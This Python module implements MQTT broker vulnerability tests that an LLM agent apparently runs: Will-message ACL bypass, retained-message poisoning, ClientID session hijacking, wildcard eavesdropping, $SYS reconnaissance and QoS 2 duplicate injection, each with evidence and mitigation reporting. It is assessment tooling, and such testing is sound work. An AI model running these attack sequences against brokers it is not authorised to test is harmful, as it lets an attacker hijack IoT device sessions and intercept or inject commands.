"""
Targeted Vulnerability Attack Modules

Each class implements a specific attack from the vulnerability catalog defined
in Burglars' IoT Paradise and MQTTactic. These are NOT random fuzzing — they
are precise, multi-step attack sequences designed to test whether the broker
is susceptible to each known vulnerability class.

The LLM agent selects and executes these based on its analysis of the target.
"""

import time
import socket
import logging
import threading
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any

from agent.broker.connector import (
    RawMQTTConnection,
    build_connect, build_publish, build_subscribe,
    build_pubrel, build_disconnect, MQTTResponse,
)
from agent.spec.mqtt_spec import PacketType, VULNERABILITY_CLASSES

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────
# Attack Result
# ─────────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    vulnerability_id: str
    vulnerability_name: str
    broker_host: str
    broker_port: int
    success: bool
    confidence: str  # "HIGH", "MEDIUM", "LOW"
    evidence: List[str] = field(default_factory=list)
    reproduction_steps: List[str] = field(default_factory=list)
    raw_packets: List[str] = field(default_factory=list)
    mitigation: str = ""
    error: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "vulnerability_id": self.vulnerability_id,
            "vulnerability_name": self.vulnerability_name,
            "broker": f"{self.broker_host}:{self.broker_port}",
            "success": self.success,
            "confidence": self.confidence,
            "evidence": self.evidence,
            "reproduction_steps": self.reproduction_steps,
            "mitigation": self.mitigation,
        }

    def __str__(self) -> str:
        status = "VULNERABLE" if self.success else "NOT VULNERABLE"
        lines = [
            f"[{self.vulnerability_id}] {self.vulnerability_name}",
            f"  Status: {status} (confidence: {self.confidence})",
        ]
        if self.evidence:
            lines.append("  Evidence:")
            for e in self.evidence:
                lines.append(f"    - {e}")
        if self.reproduction_steps:
            lines.append("  Reproduction:")
            for i, s in enumerate(self.reproduction_steps, 1):
                lines.append(f"    {i}. {s}")
        return "\n".join(lines)


# ─────────────────────────────────────────────────────────────
# Base Attack
# ─────────────────────────────────────────────────────────────

class BaseAttack(ABC):
    """Abstract base class for all vulnerability attacks."""

    VULN_ID: str = ""
    VULN_NAME: str = ""

    def __init__(self, host: str = "localhost", port: int = 1883):
        self.host = host
        self.port = port

    def _new_conn(self, timeout: float = 5.0) -> RawMQTTConnection:
        return RawMQTTConnection(self.host, self.port, timeout)

    @abstractmethod
    def run(self) -> AttackResult:
        """Execute the attack and return result."""
        ...

    def _make_result(self, success: bool, confidence: str = "HIGH", **kwargs) -> AttackResult:
        vuln_info = VULNERABILITY_CLASSES.get(self.VULN_ID, {})
        return AttackResult(
            vulnerability_id=self.VULN_ID,
            vulnerability_name=self.VULN_NAME or vuln_info.get("name", self.VULN_ID),
            broker_host=self.host,
            broker_port=self.port,
            success=success,
            confidence=confidence,
            mitigation=vuln_info.get("mitigation", "Consult broker documentation"),
            **kwargs,
        )


# ─────────────────────────────────────────────────────────────
# V1: Unauthorized Will Message
# ─────────────────────────────────────────────────────────────

class WillMessageAttack(BaseAttack):
    """
    V1: Unauthorized Will Message Exploitation
    Source: Burglars' IoT Paradise §V.A

    Attack: Connect with a Will message targeting a restricted/high-value topic.
    Abruptly close TCP connection. Observer checks if Will was published.

    Real-world impact: Attacker can inject messages into topics they cannot
    directly publish to, bypassing ACL controls.
    """

    VULN_ID = "V1_UNAUTHORIZED_WILL"
    VULN_NAME = "Unauthorized Will Message Exploitation"

    def __init__(self, host: str = "localhost", port: int = 1883,
                 will_topics: Optional[List[str]] = None):
        super().__init__(host, port)
        self.will_topics = will_topics or [
            "$SYS/test",
            "restricted/admin",
            "commands/all",
            "alerts/critical",
        ]

    def run(self) -> AttackResult:
        evidence = []
        received_wills = []

        for will_topic in self.will_topics:
            # Step 1: Set up observer subscriber
            received = threading.Event()
            observer_msgs = []

            def observer_thread(topic: str):
                try:
                    import paho.mqtt.client as mqtt
                    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="will_observer")
                    c.on_message = lambda cl, ud, m: (
                        observer_msgs.append((m.topic, m.payload)),
                        received.set()
                    )
                    c.connect(self.host, self.port, 5)
                    c.subscribe(topic, 0)
                    c.loop_start()
                    received.wait(timeout=5.0)
                    c.loop_stop()
                    c.disconnect()
                except Exception as e:
                    logger.debug(f"Observer error: {e}")

            t = threading.Thread(target=observer_thread, args=(will_topic,), daemon=True)
            t.start()
            time.sleep(0.3)  # Let observer connect

            # Step 2: Attacker connects with Will on the monitored topic
            conn = self._new_conn()
            conn.connect_tcp()

            connect_pkt = build_connect(
                client_id="will_attacker",
                will_topic=will_topic,
                will_message=b"UNAUTHORIZED_WILL_FROM_ATTACKER",
                will_qos=0,
                will_retain=False,
            )
            conn.send(connect_pkt)
            connack = conn.recv_parsed(timeout=3.0)

            if connack is None or connack.connack_return_code != 0:
                evidence.append(f"Broker rejected attacker connection for topic {will_topic}")
                conn.close()
                t.join(timeout=6.0)
                continue

            evidence.append(f"Attacker connected with Will targeting '{will_topic}'")

            # Step 3: Abruptly close TCP (simulates ungraceful disconnect)
            # This triggers Will delivery per MQTT spec §3.1.2.5
            conn.close()  # No DISCONNECT packet — raw TCP close
            evidence.append("TCP connection abruptly closed (no DISCONNECT packet sent)")

            # Step 4: Check if Will was delivered to observer
            t.join(timeout=6.0)

            if observer_msgs:
                for msg_topic, msg_payload in observer_msgs:
                    received_wills.append({
                        "topic": msg_topic,
                        "payload": msg_payload.decode("latin-1"),
                    })
                    evidence.append(
                        f"WILL DELIVERED: topic='{msg_topic}' payload='{msg_payload[:50]}'"
                    )

        success = len(received_wills) > 0

        return self._make_result(
            success=success,
            confidence="HIGH" if success else "MEDIUM",
            evidence=evidence,
            reproduction_steps=[
                f"Connect with client_id='attacker', will_topic='{self.will_topics[0]}', will_message='ATTACK'",
                "Wait for CONNACK (return code 0x00)",
                "Close TCP connection without sending DISCONNECT",
                "Observe that broker delivers Will to topic observer",
                "Attacker has published to a topic without explicit PUBLISH permission",
            ],
        )


# ─────────────────────────────────────────────────────────────
# V2: Unauthorized Retained Message
# ─────────────────────────────────────────────────────────────

class RetainedMessageAttack(BaseAttack):
    """
    V2: Retained Message Poisoning
    Source: Burglars' IoT Paradise §V.B

    Attack: Publish a retained message to a topic. After disconnect,
    any new subscriber to that topic receives the attacker's message.
    Persistent data poisoning attack.
    """

    VULN_ID = "V2_UNAUTHORIZED_RETAIN"
    VULN_NAME = "Unauthorized Retained Message Exploitation"

    POISON_PAYLOAD = b"POISONED_BY_ATTACKER_" + b"A" * 32

    def run(self) -> AttackResult:
        evidence = []
        target_topic = "fuzz/retain_test"

        # Step 1: Publish retained message as "attacker"
        with self._new_conn() as conn:
            resp = conn.mqtt_connect(client_id="retain_attacker")
            if not resp or resp.connack_return_code != 0:
                return self._make_result(
                    False, "LOW",
                    evidence=["Attacker could not connect"],
                    error="Connection rejected"
                )
            evidence.append("Attacker connected successfully")

            pkt = build_publish(target_topic, self.POISON_PAYLOAD, retain=True)
            conn.send(pkt)
            evidence.append(f"Attacker published retained message to '{target_topic}'")

        # Brief gap — attacker disconnects
        time.sleep(0.2)

        # Step 2: Innocent subscriber connects AFTER attacker disconnects
        received_payload = None
        try:
            import paho.mqtt.client as mqtt
            c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="innocent_subscriber")
            recv_event = threading.Event()

            def on_msg(client, ud, msg):
                nonlocal received_payload
                received_payload = msg.payload
                recv_event.set()

            c.on_message = on_msg
            c.connect(self.host, self.port, 5)
            c.subscribe(target_topic, 0)
            c.loop_start()
            recv_event.wait(timeout=5.0)
            c.loop_stop()
            c.disconnect()
        except Exception as e:
            evidence.append(f"Observer connection error: {e}")

        # Step 3: Clean up retained message
        try:
            with self._new_conn() as conn:
                conn.mqtt_connect(client_id="retain_cleanup")
                conn.send(build_publish(target_topic, b"", retain=True))  # Clear retain
        except Exception:
            pass

        success = received_payload == self.POISON_PAYLOAD

        if success:
            evidence.append(
                f"RETAINED MESSAGE RECEIVED by new subscriber: "
                f"{received_payload[:50].decode('latin-1')!r}"
            )
        else:
            evidence.append(
                f"New subscriber did NOT receive attacker's retained message "
                f"(received: {received_payload!r})"
            )

        return self._make_result(
            success=success,
            confidence="HIGH" if success else "MEDIUM",
            evidence=evidence,
            reproduction_steps=[
                f"CONNECT as attacker with clean_session=True",
                f"PUBLISH to '{target_topic}' with retain=True and arbitrary payload",
                "DISCONNECT",
                "New client CONNECTs and SUBSCRIBEs to same topic",
                "New client receives attacker's payload — persistent data poisoning",
            ],
        )


# ─────────────────────────────────────────────────────────────
# V3: ClientID Session Hijacking
# ─────────────────────────────────────────────────────────────

class ClientIDHijackingAttack(BaseAttack):
    """
    V3: ClientID-Based Session Hijacking
    Source: Burglars' IoT Paradise §V.C

    Attack: When a broker allows unauthenticated connections, an attacker
    can connect with the same ClientID as a legitimate client. The broker
    disconnects the legitimate client and gives the attacker its session
    (subscriptions, queued messages).
    """

    VULN_ID = "V3_CLIENTID_HIJACKING"
    VULN_NAME = "ClientID Session Hijacking"

    TARGET_CLIENT_ID = "victim_device_001"
    TARGET_TOPIC = "device/commands"

    def run(self) -> AttackResult:
        evidence = []
        victim_disconnected = threading.Event()
        queued_msgs_received = []

        # Step 1: Victim connects with persistent session and subscribes
        victim_conn = self._new_conn(timeout=10.0)
        victim_conn.connect_tcp()

        resp = victim_conn.mqtt_connect(
            client_id=self.TARGET_CLIENT_ID,
            clean_session=False,  # Persistent session — critical for this attack
        )
        if not resp or resp.connack_return_code != 0:
            victim_conn.close()
            return self._make_result(
                False, "LOW",
                evidence=["Victim could not connect"],
                error="Initial connection failed"
            )
        evidence.append(f"Victim connected with persistent session, ClientID='{self.TARGET_CLIENT_ID}'")

        # Victim subscribes to a command topic
        victim_conn.send(build_subscribe(self.TARGET_TOPIC, requested_qos=1))
        suback = victim_conn.recv_parsed(timeout=3.0)
        if suback:
            evidence.append(f"Victim subscribed to '{self.TARGET_TOPIC}'")

        # Step 2: Publish a queued message (should be held for persistent session)
        time.sleep(0.1)
        with self._new_conn() as pub_conn:
            pub_conn.mqtt_connect(client_id="message_publisher")
            pub_conn.send(build_publish(
                self.TARGET_TOPIC,
                b"SECRET_COMMAND_FOR_VICTIM",
                qos=1, packet_id=42
            ))
        evidence.append(f"Publisher sent QoS 1 message to '{self.TARGET_TOPIC}'")

        # Step 3: Attacker connects with SAME ClientID
        time.sleep(0.2)
        attacker_conn = self._new_conn(timeout=5.0)
        attacker_conn.connect_tcp()

        attacker_resp = attacker_conn.mqtt_connect(
            client_id=self.TARGET_CLIENT_ID,  # Same ClientID as victim!
            clean_session=False,  # Request persistent session
        )

        if attacker_resp and attacker_resp.connack_return_code == 0:
            evidence.append(f"Attacker connected with same ClientID='{self.TARGET_CLIENT_ID}'")
            if attacker_resp.connack_session_present:
                evidence.append("CRITICAL: Broker indicated session_present=1 (attacker got victim's session!)")

            # Step 4: Check if attacker receives queued messages
            queued_resp = attacker_conn.recv_parsed(timeout=3.0)
            if queued_resp and queued_resp.packet_type == PacketType.PUBLISH:
                queued_msgs_received.append(queued_resp)
                payload = queued_resp.payload[queued_resp.payload.index(b'\x00')+2:] if b'\x00' in queued_resp.payload else queued_resp.payload
                evidence.append(f"ATTACKER RECEIVED VICTIM'S QUEUED MESSAGE: {queued_resp.payload.hex()}")
        else:
            evidence.append("Broker rejected attacker's duplicate ClientID connection")

        # Check if victim was disconnected
        try:
            victim_conn._sock.settimeout(1.0)
            data = victim_conn._sock.recv(1024)
            if data == b"" or data is None:
                victim_disconnected.set()
                evidence.append("Victim's TCP connection was terminated by broker (session takeover)")
        except (socket.timeout, OSError, AttributeError):
            # Timeout could mean victim is just idle, not disconnected
            pass

        victim_conn.close()
        attacker_conn.close()

        success = (
            attacker_resp is not None
            and attacker_resp.connack_return_code == 0
            and (attacker_resp.connack_session_present or len(queued_msgs_received) > 0)
        )

        return self._make_result(
            success=success,
            confidence="HIGH" if len(queued_msgs_received) > 0 else ("MEDIUM" if success else "LOW"),
            evidence=evidence,
            reproduction_steps=[
                f"Victim: CONNECT with ClientID='{self.TARGET_CLIENT_ID}', clean_session=False",
                f"Victim: SUBSCRIBE to '{self.TARGET_TOPIC}' (QoS 1)",
                f"Publisher sends QoS 1 message to '{self.TARGET_TOPIC}'",
                f"Attacker: CONNECT with same ClientID='{self.TARGET_CLIENT_ID}', clean_session=False",
                "Check: broker returns CONNACK with session_present=1",
                "Attacker receives queued messages meant for victim",
                "Victim's connection is terminated",
            ],
        )


# ─────────────────────────────────────────────────────────────
# V4: Topic Authorization Bypass
# ─────────────────────────────────────────────────────────────

class TopicAuthBypassAttack(BaseAttack):
    """
    V4: Topic Authorization Bypass via Wildcards
    Source: MQTTactic §4.2 + Burglars §V.D

    Attack: Subscribe using '#' (global wildcard) to receive ALL messages
    on the broker. If the broker has no ACL or faulty ACL validation,
    a completely unauthorized client sees everything.
    """

    VULN_ID = "V4_TOPIC_AUTH_BYPASS"
    VULN_NAME = "Topic Authorization Bypass via Wildcards"

    def run(self) -> AttackResult:
        evidence = []
        received_messages = []
        recv_event = threading.Event()

        # Start attacker subscriber in background
        def attacker_subscriber():
            try:
                import paho.mqtt.client as mqtt
                c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="attacker_wildcard")

                def on_subscribe(cl, ud, mid, granted_qos, props=None):
                    if granted_qos and granted_qos[0] < 128:
                        evidence.append(f"Wildcard subscription GRANTED with QoS={granted_qos[0]}")
                    else:
                        evidence.append(f"Wildcard subscription DENIED (granted_qos={granted_qos})")

                def on_message(cl, ud, msg):
                    received_messages.append((msg.topic, msg.payload))
                    recv_event.set()

                c.on_subscribe = on_subscribe
                c.on_message = on_message
                c.connect(self.host, self.port, 5)
                c.subscribe("#", 0)  # Global wildcard
                c.loop_start()
                recv_event.wait(timeout=5.0)
                c.loop_stop()
                c.disconnect()
            except Exception as e:
                evidence.append(f"Attacker subscriber error: {e}")

        t = threading.Thread(target=attacker_subscriber, daemon=True)
        t.start()
        time.sleep(0.5)

        # Publish a test message — attacker should receive it if bypass works
        secret_topics = [
            ("internal/sensors", b"SENSOR_READING=42"),
            ("device/credentials", b"API_KEY=secret123"),
            ("admin/commands", b"CMD=reboot"),
        ]

        for topic, payload in secret_topics:
            with self._new_conn() as pub:
                pub.mqtt_connect(client_id="legit_publisher")
                pub.send(build_publish(topic, payload))
            time.sleep(0.1)

        t.join(timeout=6.0)

        if received_messages:
            for topic, payload in received_messages:
                evidence.append(f"ATTACKER RECEIVED: topic='{topic}', payload='{payload[:50]}'")

        success = len(received_messages) > 0

        return self._make_result(
            success=success,
            confidence="HIGH" if success else "MEDIUM",
            evidence=evidence,
            reproduction_steps=[
                "CONNECT as unauthenticated client",
                "SUBSCRIBE to '#' (global wildcard)",
                "Check SUBACK granted QoS — should be 0x80 (failure) without ACL",
                "Other clients publish to various topics",
                "If attacker receives messages from any topic = authorization bypass",
            ],
        )


# ─────────────────────────────────────────────────────────────
# V6: $SYS Topic Information Disclosure
# ─────────────────────────────────────────────────────────────

class SysTopicDisclosureAttack(BaseAttack):
    """
    V6: $SYS Topic Information Disclosure
    Source: Burglars' IoT Paradise §V.E

    Attack: Subscribe to $SYS/# as an unauthenticated client.
    Exposed data can include: broker version, connected client count,
    client list, uptime, memory usage — valuable reconnaissance data.
    """

    VULN_ID = "V6_SYS_TOPIC_EXPOSURE"
    VULN_NAME = "$SYS Topic Information Disclosure"

    def run(self) -> AttackResult:
        evidence = []
        sys_data = {}
        recv_event = threading.Event()

        def sys_subscriber():
            try:
                import paho.mqtt.client as mqtt
                c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="sys_probe")

                def on_message(cl, ud, msg):
                    sys_data[msg.topic] = msg.payload.decode("utf-8", errors="replace")
                    if len(sys_data) >= 3:
                        recv_event.set()

                c.on_message = on_message
                c.connect(self.host, self.port, 5)
                c.subscribe("$SYS/#", 0)
                c.loop_start()
                recv_event.wait(timeout=5.0)
                c.loop_stop()
                c.disconnect()
            except Exception as e:
                evidence.append(f"Error: {e}")

        t = threading.Thread(target=sys_subscriber, daemon=True)
        t.start()
        t.join(timeout=6.0)

        sensitive_fields = [
            "$SYS/broker/version",
            "$SYS/broker/clients/connected",
            "$SYS/broker/clients/total",
            "$SYS/broker/clients/maximum",
            "$SYS/broker/load/connections/1min",
        ]

        found_sensitive = []
        for topic, value in sys_data.items():
            evidence.append(f"$SYS exposed: {topic} = {value[:80]}")
            if topic in sensitive_fields:
                found_sensitive.append(topic)

        success = len(sys_data) > 0

        return self._make_result(
            success=success,
            confidence="HIGH" if found_sensitive else ("MEDIUM" if success else "LOW"),
            evidence=evidence,
            reproduction_steps=[
                "CONNECT without credentials",
                "SUBSCRIBE to '$SYS/#'",
                "Observe broker publishing system statistics",
                f"Found {len(sys_data)} $SYS topics exposed to unauthenticated client",
            ],
        )


# ─────────────────────────────────────────────────────────────
# V7: Zero-Length ClientID Spec Violation
# ─────────────────────────────────────────────────────────────

class ZeroLengthClientIDAttack(BaseAttack):
    """
    V7: Zero-Length ClientID Clean Session Bypass
    Source: MQTT 3.1.1 §3.1.3.1

    The spec requires that a zero-length ClientID MUST be paired with
    clean_session=True. Brokers that accept empty ClientID + clean_session=False
    violate the spec and may create shared/colliding sessions.
    """

    VULN_ID = "V7_ZERO_LENGTH_CLIENTID"
    VULN_NAME = "Zero-Length ClientID Spec Violation"

    def run(self) -> AttackResult:
        evidence = []
        violations = []

        # Test 1: Empty ClientID with clean_session=False (MUST be rejected)
        with self._new_conn() as conn:
            pkt = build_connect(client_id="", clean_session=False)
            conn.connect_tcp()
            conn.send(pkt)
            resp = conn.recv_parsed(timeout=3.0)

            if resp is None:
                evidence.append("Test 1: No CONNACK received (broker may have dropped connection)")
            elif resp.connack_return_code == 0:
                violations.append("SPEC VIOLATION: Broker accepted empty ClientID with clean_session=False (should return 0x02)")
                evidence.append(f"Test 1 (empty ID, persistent): CONNACK return_code=0x00 ACCEPTED — VIOLATION!")
            elif resp.connack_return_code == 0x02:
                evidence.append("Test 1 (empty ID, persistent): Correctly rejected with 0x02 (Identifier Rejected)")
            else:
                evidence.append(f"Test 1 (empty ID, persistent): CONNACK return_code=0x{resp.connack_return_code:02X}")

        # Test 2: Empty ClientID with clean_session=True (SHOULD be accepted per spec)
        with self._new_conn() as conn:
            pkt = build_connect(client_id="", clean_session=True)
            conn.connect_tcp()
            conn.send(pkt)
            resp = conn.recv_parsed(timeout=3.0)

            if resp and resp.connack_return_code == 0:
                evidence.append("Test 2 (empty ID, clean session): Correctly accepted (CONNACK 0x00)")
            elif resp:
                evidence.append(f"Test 2 (empty ID, clean session): Rejected with 0x{resp.connack_return_code:02X} (may be acceptable)")
            else:
                evidence.append("Test 2 (empty ID, clean session): No CONNACK")

        # Test 3: Null bytes in ClientID
        with self._new_conn() as conn:
            pkt = build_connect(client_id="client\x00null")
            conn.connect_tcp()
            conn.send(pkt)
            resp = conn.recv_parsed(timeout=3.0)
            if resp:
                evidence.append(f"Test 3 (null byte in ClientID): CONNACK 0x{resp.connack_return_code:02X}")
                if resp.connack_return_code == 0:
                    violations.append("WARNING: Broker accepted ClientID containing null byte")
            else:
                evidence.append("Test 3 (null byte in ClientID): No response")

        success = len(violations) > 0

        return self._make_result(
            success=success,
            confidence="HIGH" if success else "HIGH",  # High confidence either way
            evidence=evidence + violations,
            reproduction_steps=[
                "Send CONNECT: client_id='', clean_session=False",
                "Spec (§3.1.3.1): CONNACK MUST return 0x02 (Identifier Rejected)",
                "If CONNACK returns 0x00 (Accepted): spec violation confirmed",
            ],
        )


# ─────────────────────────────────────────────────────────────
# V5: QoS 2 Duplicate Message Injection
# ─────────────────────────────────────────────────────────────

class QoS2DuplicateAttack(BaseAttack):
    """
    V5: QoS 2 Duplicate Message Injection
    Source: FUME §3.3 + MQTTactic §4.3

    Attack: During QoS 2 handshake, send duplicate PUBLISH with same
    packet_id before the handshake completes. Some brokers store duplicates,
    deliver the message multiple times, or exhibit undefined behavior.
    """

    VULN_ID = "V5_QOS2_TIMING"
    VULN_NAME = "QoS 2 Duplicate Message Injection"

    def run(self) -> AttackResult:
        evidence = []
        duplicates_delivered = []
        recv_event = threading.Event()

        # Set up an observer to count message deliveries
        def delivery_counter():
            try:
                import paho.mqtt.client as mqtt
                c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="qos2_observer")
                c.on_message = lambda cl, ud, m: (
                    duplicates_delivered.append(m.payload),
                    recv_event.set() if len(duplicates_delivered) >= 2 else None
                )
                c.connect(self.host, self.port, 5)
                c.subscribe("fuzz/qos2_test", 2)
                c.loop_start()
                recv_event.wait(timeout=6.0)
                c.loop_stop()
                c.disconnect()
            except Exception as e:
                evidence.append(f"Observer error: {e}")

        t = threading.Thread(target=delivery_counter, daemon=True)
        t.start()
        time.sleep(0.3)

        # Attacker sends QoS 2 with duplicate before completing handshake
        conn = self._new_conn(timeout=3.0)
        conn.connect_tcp()
        resp = conn.mqtt_connect(client_id="qos2_attacker")

        if not resp or resp.connack_return_code != 0:
            conn.close()
            t.join(timeout=2)
            return self._make_result(False, "LOW", evidence=["Could not connect"])

        evidence.append("Connected as attacker")

        # Send first QoS 2 PUBLISH
        pkt1 = build_publish("fuzz/qos2_test", b"QOS2_MESSAGE_1", qos=2, packet_id=1)
        conn.send(pkt1)
        evidence.append("Sent QoS 2 PUBLISH (packet_id=1)")

        # Get PUBREC
        pubrec = conn.recv_parsed(timeout=3.0)
        if pubrec and pubrec.packet_type == PacketType.PUBREC:
            evidence.append("Received PUBREC — QoS 2 handshake in progress")

            # Inject duplicate PUBLISH with same packet_id BEFORE sending PUBREL
            pkt_dup = build_publish("fuzz/qos2_test", b"QOS2_DUPLICATE", qos=2, packet_id=1, dup=True)
            conn.send(pkt_dup)
            evidence.append("Sent DUPLICATE PUBLISH (same packet_id=1, dup=True) before PUBREL")

            # Now complete the handshake
            time.sleep(0.1)
            conn.send(build_pubrel(1))
            pubcomp = conn.recv_parsed(timeout=3.0)
            if pubcomp:
                evidence.append(f"Received: {pubcomp.type_name}")

        conn.close()
        t.join(timeout=7.0)

        if len(duplicates_delivered) > 1:
            evidence.append(f"DUPLICATE DELIVERY: Observer received {len(duplicates_delivered)} messages for one QoS 2 PUBLISH")
        else:
            evidence.append(f"Observer received {len(duplicates_delivered)} message(s) (expected: 1)")

        success = len(duplicates_delivered) > 1

        return self._make_result(
            success=success,
            confidence="MEDIUM",
            evidence=evidence,
            reproduction_steps=[
                "CONNECT as attacker",
                "PUBLISH (QoS=2, packet_id=1, topic='fuzz/qos2_test')",
                "Receive PUBREC",
                "Before sending PUBREL: send duplicate PUBLISH (QoS=2, packet_id=1, dup=True)",
                "Send PUBREL, receive PUBCOMP",
                "If observer received >1 message: duplicate injection succeeded",
            ],
        )


# ─────────────────────────────────────────────────────────────
# Attack Runner
# ─────────────────────────────────────────────────────────────

class AttackRunner:
    """Runs all targeted vulnerability attacks and collects results."""

    def __init__(self, host: str = "localhost", port: int = 1883):
        self.host = host
        self.port = port
        self.attacks = [
            WillMessageAttack(host, port),
            RetainedMessageAttack(host, port),
            ClientIDHijackingAttack(host, port),
            TopicAuthBypassAttack(host, port),
            QoS2DuplicateAttack(host, port),
            SysTopicDisclosureAttack(host, port),
            ZeroLengthClientIDAttack(host, port),
        ]
        self.results: List[AttackResult] = []

    def run_all(self) -> List[AttackResult]:
        """Run all attacks sequentially."""
        for attack in self.attacks:
            logger.info(f"Running attack: {attack.VULN_ID} - {attack.VULN_NAME}")
            try:
                result = attack.run()
                self.results.append(result)
                logger.info(f"  Result: {'VULNERABLE' if result.success else 'NOT VULNERABLE'} [{result.confidence}]")
            except Exception as e:
                logger.error(f"  Attack {attack.VULN_ID} failed with exception: {e}")
                self.results.append(AttackResult(
                    vulnerability_id=attack.VULN_ID,
                    vulnerability_name=attack.VULN_NAME,
                    broker_host=self.host,
                    broker_port=self.port,
                    success=False,
                    confidence="LOW",
                    error=str(e),
                ))
        return self.results

    def run_by_id(self, vuln_id: str) -> Optional[AttackResult]:
        """Run a specific attack by vulnerability ID."""
        for attack in self.attacks:
            if attack.VULN_ID == vuln_id:
                result = attack.run()
                self.results.append(result)
                return result
        return None

    def vulnerable_count(self) -> int:
        return sum(1 for r in self.results if r.success)

    def summary(self) -> str:
        lines = [
            f"\n{'='*60}",
            f"VULNERABILITY ASSESSMENT SUMMARY",
            f"Target: {self.host}:{self.port}",
            f"{'='*60}",
        ]
        for r in self.results:
            status = "VULNERABLE  " if r.success else "SAFE        "
            lines.append(f"  [{status}] [{r.confidence:6s}] {r.vulnerability_id}: {r.vulnerability_name}")
        lines.append(f"{'='*60}")
        lines.append(f"Total: {self.vulnerable_count()}/{len(self.results)} vulnerabilities confirmed")
        return "\n".join(lines)
